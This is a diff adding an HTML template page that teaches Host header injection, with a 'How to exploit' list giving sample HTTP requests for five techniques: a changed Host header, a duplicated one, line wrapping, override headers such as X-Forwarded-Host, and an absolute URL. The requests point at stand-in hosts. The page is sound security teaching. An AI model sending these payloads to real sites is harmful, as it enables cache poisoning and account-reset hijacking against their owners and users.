@@ -1,0 +1,118 @@
+{% extends 'base.html' %}
+{% block body %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Host Header Injection</title>
+    <style>
+body, h1, h2, p, ol, li, pre, code {
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    line-height: 1.6;
+}
+
+article {
+    max-width: 800px;
+    margin: 0 auto;
+}
+
+h1 {
+    font-size: 2em;
+    margin-bottom: 20px;
+}
+
+h2 {
+    font-size: 1.5em;
+    margin-top: 20px;
+    margin-bottom: 10px;
+}
+
+section {
+    margin-bottom: 20px;
+}
+
+pre {
+    background-color: #f8f8f8;
+    padding: 10px;
+    border-radius: 5px;
+    margin-bottom: 10px;
+}
+
+code {
+    font-family: Consolas, monospace;
+}
+
+/* Style Markdown code blocks */
+pre code {
+    display: block;
+    padding: 10px;
+    background-color: #f0f0f0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    overflow-x: auto;
+}
+
+    </style>
+</head>
+<body>
+    <h1>Host Header Injection</h1>
+
+    <h2>Introduction</h2>
+    <p>HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. Attacks that involve injecting a payload directly into the Host header are often known as "Host header injection" attacks.</p>
+
+    <h2>How to exploit</h2>
+    <ol>
+        <li>
+            <p>Change the host header</p>
+            <pre><code>GET /index.php HTTP/1.1
+Host: evil-website.com
+...</code></pre>
+        </li>
+        <li>
+            <p>Duplicating the host header</p>
+            <pre><code>GET /index.php HTTP/1.1
+Host: vulnerable-website.com
+Host: evil-website.com
+...</code></pre>
+        </li>
+        <li>
+            <p>Add line wrapping</p>
+            <pre><code>GET /index.php HTTP/1.1
+ Host: vulnerable-website.com
+Host: evil-website.com
+...</code></pre>
+        </li>
+        <li>
+            <p>Add host override headers</p>
+            <pre><code>X-Forwarded-For: evil-website.com
+X-Forwarded-Host: evil-website.com
+X-Client-IP: evil-website.com
+X-Remote-IP: evil-website.com
+X-Remote-Addr: evil-website.com
+X-Host: evil-website.com</code></pre>
+            <p>How to use? In this case, I'm using "X-Forwarded-For : evil.com"</p>
+            <pre><code>GET /index.php HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-For : evil-website.com
+...</code></pre>
+        </li>
+        <li>
+            <p>Supply an absolute URL</p>
+            <pre><code>GET https://vulnerable-website.com/ HTTP/1.1
+Host: evil-website.com
+...</code></pre>
+        </li>
+    </ol>
+
+    <h2>References</h2>
+    <ul>
+        <li><a href="https://portswigger.net/web-security/host-header/exploiting">PortSwigger</a></li>
+    </ul>
+</body>
+{% endblock %}
